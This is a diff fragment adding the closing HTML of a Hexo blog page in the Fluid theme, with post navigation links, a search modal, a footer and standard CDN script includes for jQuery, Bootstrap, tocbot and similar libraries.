+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">用beautifulsoup简单爬取英语音频</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/16/old/hexo%E5%8D%9A%E5%AE%A2%EF%BD%9Cwindows%E8%BF%81%E7%A7%BB%E5%88%B0mac/" title="hexo博客｜win10迁移到Mac">
+                        <span class="hidden-mobile">hexo博客｜win10迁移到Mac</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       主题： <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
